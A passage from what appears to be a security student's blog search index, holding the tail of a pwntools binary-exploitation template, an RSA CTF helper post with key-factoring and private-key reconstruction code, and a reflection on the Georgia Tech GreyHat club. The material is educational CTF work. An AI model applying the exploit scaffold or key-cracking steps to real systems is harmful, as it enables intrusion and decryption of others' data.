class="string">"\n"</span>.join(gdb_cmd))</span><br><span class="line">debugging = <span class="keyword">True</span></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">Exploit</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Examples:</span></span><br><span class="line"><span class="string">func_offset = libc.symbols['puts'] # Offset in libc</span></span><br><span class="line"><span class="string">puts_addr = p32(e.got['puts'])</span></span><br><span class="line"><span class="string">main = e.symbols['main']</span></span><br><span class="line"><span class="string">addr_string = next(e.search('/bin/cat flag.txt'))</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">p.sendline(cyclic(<span class="number">100</span>, n=<span class="number">8</span> <span class="keyword">if</span> x64 <span class="keyword">else</span> <span class="number">4</span>))</span><br><span class="line"><span class="comment"># buf = cyclic_find('', n=8 if x64 else 4) * 'a'</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
        <tags>
            
            <tag> Binary Exploitation </tag>
            
            <tag> Pwntools </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>RSA Tool</title>
      <link href="/RSA-Tool/"/>
      <url>/RSA-Tool/</url>
      <content type="html"><![CDATA[<p>Many CTF competitions come with some kind of RSA cryptography challenge. These challenges vary in difficulty but usually use the same textbook RSA calculations. To speed up my solve times, I’ve created some simple scripts to help solve the most common RSA CTF challenges. Many of them are snippets I’ve found online and adapted to work with my utilities.</p><h2 id="Installation"><a href="#Installation" class="headerlink" title="Installation"></a>Installation</h2><p>Download the folder linked below and then install dependencies.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">virtualenv venv</span><br><span class="line"><span class="built_in">source</span> venv/bin/activate</span><br><span class="line">pip install -r requirements.txt</span><br></pre></td></tr></table></figure><h2 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h2><p><code>run.py</code> is the runner program. You can use all the functions in <code>attack_functions.py</code> and <code>pem_utilities.py</code>.</p><ol><li><p><code>attack_functions</code> contains functions that perform numerical attacks against RSA and provides some basic utilities, such as converting integers to ASCII text.</p></li><li><p><code>pem_utilities</code> contains functions that make it easier to work with PEM files or files that have been encrypted using openssl.</p></li></ol><h3 id="Online-Factorization"><a href="#Online-Factorization" class="headerlink" title="Online Factorization"></a>Online Factorization</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> attack_functions <span class="keyword">import</span> *</span><br><span class="line">n = <span class="number">28951349384423043218983050540262097638996616109955577558902029524079760750158684923657109854846122191130360573015845720440777033197971499589196069264739625195198815368193977724349036642939995805368573744328447244579642526857449768268753834475805477560338041038092683043149578111742677114084484145949297041276137332636132506885331222738476811693140185976545715701414240079516065192740228585267852582046443608026161708941442363792964096239980728739084441464942853065825759132585180831506997153733610602370711588167486294114891207572485931146617054305640945613324997820264892045579903140276482436750764783137418434959509</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">4531850464036745618300770366164614386495084945985129111541252641569745463086472656370005978297267807299415858324820149933137259813719550825795569865301790252501254180057121806754411506817019631341846094836070057184169015820234429382145019281935017707994070217705460907511942438972962653164287761695982230728969508370400854478181107445003385579261993625770566932506870421547033934140554009090766102575218045185956824020910463996496543098753308927618692783836021742365910050093343747616861660744940014683025321538719970946739880943167282065095406465354971096477229669290277771547093476011147370441338501427786766482964</span></span><br><span class="line"></span><br><span class="line">p, q = factordb(n)</span><br><span class="line"><span class="keyword">print</span> ascii(given_p_q(c, e, n, p, q))</span><br></pre></td></tr></table></figure><h3 id="Working-with-PEMs"><a href="#Working-with-PEMs" class="headerlink" title="Working with PEMs"></a>Working with PEMs</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> attack_functions <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pem_utilities <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> glob</span><br><span class="line"></span><br><span class="line"><span class="comment"># Get all file names that end with .key or .enc (if necessary)</span></span><br><span class="line"><span class="comment"># key_files = glob.glob("./*.key")</span></span><br><span class="line"><span class="comment"># cipher_files = glob.glob("./*.enc")</span></span><br><span class="line"></span><br><span class="line">ciphertext_fname = <span class="string">"flag.enc"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Crack the key, get factors</span></span><br><span class="line">p = <span class="number">0x00d1555acceb95d63216845cd1de64d6cc5ba6a878e9efb2d453b2fbd3c571a8993f804d449527f11e2c7d2f53e25afce5f99d38c5103772271be9ebaee09db41f</span></span><br><span class="line">q = <span class="number">0x00c93ceed82db2840160c52ed77b346ace00ff0b04a82f28f4ffa42c47362ec34bf885e4f8ef4304363addd5cee79f8d6cfead8b591d5167fd6168641a9fd6600d</span></span><br><span class="line">n = p * q</span><br><span class="line">phi_n = (p<span class="number">-1</span>) * (q<span class="number">-1</span>)</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">priv_key = gen_private_key_p_q(n, long(e), p, q)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Decrypt the ciphertext file</span></span><br><span class="line"><span class="comment"># decrypt_file(ciphertext_fname, priv_key)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># If you desire more accuracy, write the private key to a file then decrypt using openssl</span></span><br><span class="line"><span class="comment"># openssl rsautl -decrypt -inkey private.pem &lt; ctfexample-text.txt</span></span><br><span class="line"><span class="comment"># Write PEM to file</span></span><br><span class="line"><span class="keyword">with</span> open (<span class="string">"private.pem"</span>, <span class="string">"w"</span>) <span class="keyword">as</span> prv_file:</span><br><span class="line">    prv_file.write(<span class="string">"&#123;&#125;"</span>.format(priv_key.exportKey()))</span><br></pre></td></tr></table></figure><h2 id="Notes"><a href="#Notes" class="headerlink" title="Notes"></a>Notes</h2><ol><li>Small public modulus n - use <a href="https://factordb.com/index.php" target="_blank" rel="noopener">https://factordb.com/index.php</a> to find p and q.</li><li><p>Given multiple keys - see if any of the keys have common factors using the Euclidean Algorithm.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> fractions</span><br><span class="line">print(fractions.gcd(a, b))</span><br></pre></td></tr></table></figure></li><li><p>p and q are close to each other - use YAFU or <a href="https://www.alpertron.com.ar/ECM.HTM" target="_blank" rel="noopener">https://www.alpertron.com.ar/ECM.HTM</a></p></li><li>Two ciphertexts use the same modulus n but different exponents e - use: same_modulus.py</li><li>Small p or q - use YAFU or <a href="https://www.alpertron.com.ar/ECM.HTM" target="_blank" rel="noopener">https://www.alpertron.com.ar/ECM.HTM</a></li><li>Large e or d - Wiener’s attack. Use attackrsa tool.</li><li>Same m and e for multiple messages - Hastad’s Broadcast Attack. Use attackrsa tool.</li><li>If num_ciphertexts &gt;= e then you can use Chinese Remainder Theorem to calculate the message (but gcd of all n’s must be 1 - if the gcd between any two n’s is not 1, then you can just find a common factor between them).</li></ol><h2 id="External-Utility-Notes"><a href="#External-Utility-Notes" class="headerlink" title="External Utility Notes"></a>External Utility Notes</h2><p>Here are some commands to transform and work with keys.</p><p>Given n and d, print e, p, q.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python rsatool.py -n 13826123222358393307 -d 9793706120266356337</span><br></pre></td></tr></table></figure><p>Given n and d, print PEM format.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cd rsatool</span></span><br><span class="line">python rsatool.py -f PEM -o key_file.pem -n 13826123222358393307 -d 9793706120266356337</span><br></pre></td></tr></table></figure><p>Given p and q, print DER format.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cd rsatool</span></span><br><span class="line">python rsatool.py -f DER -o key_file.der -p 4184799299 -q 3303891593</span><br></pre></td></tr></table></figure><p>Factorize with YAFU.<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./yafu <span class="string">"factor(0xD8E24C12B7B99EFE0A9BC04A6A3DF58A2A944269B492B7376DF129023F2061B9)"</span> -threads 5</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
        <tags>
            
            <tag> RSA </tag>
            
            <tag> CTF </tag>
            
            <tag> Cryptography </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>GreyHat Reflections</title>
      <link href="/GreyHat-Reflections/"/>
      <url>/GreyHat-Reflections/</url>
      <content type="html"><![CDATA[<h2 id="Information-Security-at-Georgia-Tech"><a href="#Information-Security-at-Georgia-Tech" class="headerlink" title="Information Security at Georgia Tech"></a>Information Security at Georgia Tech</h2><p>I began my foray into information security as an 11th grader when my AP CS teacher told me about a competition hosted by CMU called picoCTF. Interested and motivated (partially by a grade), I decided to compete in a team with two friends. I only completed one challenge by the end, but I fell in love with the process of learning. I learned about bitwise operations for the reversing challenges and watched hours of RSA lectures on YouTube to crack the crypto challenges. Of course, my understanding was still rudimentary at best (I concluded that I was supposed to just factor <code>n</code> with a brute force script for the RSA challenge - ha!). In the end, though, I couldn’t believe how much I had learned in such a short time about topics I didn’t even know existed. It was then that I decided to make computer security my career.</p><p>Going into Georgia Tech, I wasn’t sure what kind of infosec community would exist (if any at all). I was very fortunate to find that there was a club called GreyHat that had a huge following and passionate officers. Unfortunately, I was still a newbie and had little knowledge of computers in general. It was difficult to understand everything, but I regularly attended the CTF meetings where we solved challenges together. At the end of the year, I ran for and was elected CTF captain for the next year. I didn’t know much but I wanted to see the club succeed and to pass on whatever little knowledge I had.</p><h2 id="CTF-Club"><a href="#CTF-Club" class="headerlink" title="CTF Club"></a>CTF Club</h2><p>Every Monday of my sophomore year, I’d fulfill my usual regimen of going to class, finishing homework, and (sometimes) hitting the gym. Around 7PM, after most people on campus had headed back to their dorms or the library, a group of passionate nerds and I would meet in an unused, cramped study space at the top floor of the CoC. Each week, I created a set of problems for the students to work through, each time teaching something new about the vast world of computers.</p><img src="/GreyHat-Reflections/ctfmeeting.jpg"><p>Of all the things I did in college, running CTF meetings was probably my favorite. I spent my time with an amazing group of people ranging from your typical computer science students to even mechanical engineers as they formed groups to tackle my problems. Later, many of them even became my close friends outside of GreyHat.</p><p>I can’t describe what an awesome feeling it was to see the relieved looks on everyone’s faces when they finally solved a problem after an hour of struggling through it. It was that same feeling that had led me to love computer security, and I was thrilled that I could pass it on to others.</p><h2 id="CSAW-CTF-Experience"><a href="#CSAW-CTF-Experience" class="headerlink" title="CSAW CTF Experience"></a>CSAW CTF Experience</h2><p>In the fall, we decided to compete online in the annual CSAW CTF Competition. We reserved our usual room, made pancakes and scrambled eggs to fuel us through, and called in some alumni (like the legendary Chris Grayson) for a whole weekend of hacking fun.</p><p>Somehow, by the end of the weekend, our Georgia Tech team ended up in 57th place out of 1367 teams in the competition. As it turned out, though, our team was 13th among the top 15 teams that qualified to go to the finals in New York City - so we did!</p><img src="/GreyHat-Reflections/csaw.jpg"><p>At CSAW finals, three others and I worked through a 36 hour non-stop hacking session on the problems we were given. While we jammed out to music and munched through an endless supply of free food for competitors, we solved many problems and learned many new things. I was still relatively inexperienced when I went, but I did manage to solve two challenges - a PDF forensics challenge worth 300 points and a simple file carving problem worth 50 points.</p><p>We didn’t win at the end of the competition but I did have one of the most fun hacking experiences of my life. It was an amazing feeling to be surrounded by so many intelligent people who shared the same passion as me. I highly recommend anyone interested in security at all to get their hands dirty with CTFs.</p><h2 id="GreyH-t-CTF"><a href="#GreyH-t-CTF" class="headerlink" title="GreyH@t CTF"></a>GreyH@t CTF</h2><p>In the spring of 2016, GreyHat decided to revive its own annual CTF competition. We opened up the competition to undergraduate and masters students so that we could cater to a wide range of students without giving too much of an edge to higher level students.</p><img src="/GreyHat-Reflections/poster.jpg"><p>The competition received sponsorship from Capital One, which generously provided us with a $400 prize pool and even bought Moe’s catering. As members of GreyHat’s board, Manas George, Max Bires, and I authored a list of puzzles to be solved during the competition. We set up an instance of RootTheBox using AWS and let everyone work on the problems for nearly 8 hours.</p><img src="/GreyHat-Reflections/greyh@tctf2016.jpg"><p>Overall, it was a great success and everyone seemed to enjoy our CTF competition. You could visibly see the frustration on competitors’ faces as the competition was coming to a close and as they rushed to solve problems. It was a good kind of frustration; the kind that you learn from. I’m looking forward to doing something like this again in the future.</p><h2 id="GreyHat-Presidency"><a href="#GreyHat-Presidency" class="headerlink" title="GreyHat Presidency"></a>GreyHat Presidency</h2><p>The following year, I was elected president of GreyHat. Being president meant that I was responsible for communicating with club members and faculty, organizing funding for club events, and most importantly, getting presentations for our regular meetings. I can honestly say that I was not prepared for the amount of work it was going to be - and I mostly blame my own lack of security knowledge. More than once I spent a weekend doing research on security topics I was unfamiliar with myself in order to give a presentation on it that week.</p><p>If I could have given myself one piece of advice, it would be to give more practice problems and fewer lectures. People really learn from doing problems together (something I had already figured out as CTF captain, duh!).</p><p>Despite my shortcomings, I really enjoyed getting to know the club members who were interested in what I taught and regularly came to my meetings. As I start my next chapter at UC Santa Barbara, I can only hope that the infosec community I meet will be as awesome and welcoming as the one I found at Georgia Tech.</p><h2 id="Presentation-Archive"><a href="#Presentation-Archive" class="headerlink" title="Presentation Archive"></a>Presentation Archive</h2><p>Here is a list of all the presentations I’ve given for anyone that’s interested.</p><h3 id="President-Presentations"><a href="#President-Presentations" class="headerlink" title="President Presentations"></a>President Presentations</h3><p>04-13-17: <a href="presentations/04-13-17_Elections_and_Password_Hashing.pptx">Elections and Password Hashing</a><br>02-02-17: <a href="presentations/02-02-17_How_to_Become_Invisible_Tor_and_VPNs.pptx">Invisibility on the Web - Tor and VPNs</a> (see <a href="https://www.youtube.com/watch?v=Uks8UDiI3Ss" target="_blank" rel="noopener">here</a> for YouTube Talk)<br>01-26-17: <a href="https://www.youtube.com/watch?v=GMCCHY8Mzfo" target="_blank" rel="noopener">Remote Tutorial - Kali Linux Virtual Machine Setup</a><br>01-19-17: <a href="presentations/01-19-17_Greyhat_Intro_2.pptx">GreyHat Introduction 2</a><br>12-01-16: Web-App CTF Challenge<br>11-03-16: <a href="presentations/11-03-16_Padding_Oracle_Attacks.pptx">Padding Oracle Attacks</a><br>09-29-16: <a href="presentations/11-16-15_CSAW15_Forensics_Problem.tar.gz">Forensics/Stego Problem</a> (repeat of 11-16-15)<br>09-15-16: <a href="presentations/09-15-16_GreyHat_SQL_Injection.pptx">SQL Injection</a><br>09-01-16: <a href="presentations/09-01-16_GreyHat_Intro.pptx">GreyHat Introduction</a><br>04-07-16: <a href="presentations/04-07-16_Cross_Site_Scripting.pptx">Cross Site Scripting</a></p><h3 id="CTF-Captain-Problems"><a href="#CTF-Captain-Problems" class="headerlink" title="CTF Captain Problems"></a>CTF Captain Problems</h3><p><a href="presentations/CTF-Problems.zip">My GreyH@t CTF 2016 Problems</a><br>11-16-15: <a href="presentations/11-16-15_CSAW15_Forensics_Problem.tar.gz">CSAW’15 Forensics Problem</a><br>11-02-15: <a href="presentations/11-02-15_Crypto_Practice_Problems.zip">Crypto Practice Problems</a><br>10-05-15: <a href="presentations/10-05-15_Steganography.zip">Steganography</a><br>09-28-15: <a href="presentations/09-28-15_Practice_Problems.zip">Practice Problems</a><br>09-21-15: <a href="presentations/09-21-15_Beginner_Crypto.zip">Beginner Crypto</a></p><h3 id="Presentations-Not-Given"><a href="#Presentations-Not-Given" class="headerlink" title="Presentations Not Given"></a>Presentations Not Given</h3><p><a href="presentations/GreyHat_OneTimePad.pptx">One Time Pad</a><br><a href="presentations/GreyHat_Crypto_History.pptx">History of Cryptography</a></p><h3 id="Bonus"><a href="#Bonus" class="headerlink" title="Bonus"></a>Bonus</h3><p>Sometime in 2016, I had the pleasure of welcoming a security researcher from Booz Allen Hamilton named Dr. Malachi Jones to talk at GreyHat. Malachi also happened to be a graduate of Georgia Tech and ended up convincing me to work at Booz Allen for my next internship. I’ve included his presentation here as well because I thought it was really well put together and very informative.</p><p><a href="presentations/Automating_Analysis_and_Exploitation_of_Embedded_Device_Firmware.pdf">Automating_Analysis_and_Exploitation_of_Embedded_Device_Firmware.pdf</a></p>]]></content>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> GreyHat </tag>
            
            <tag> Georgia Tech </tag>
            
        </tags>
      
    </entry>
    
  
  
</search>
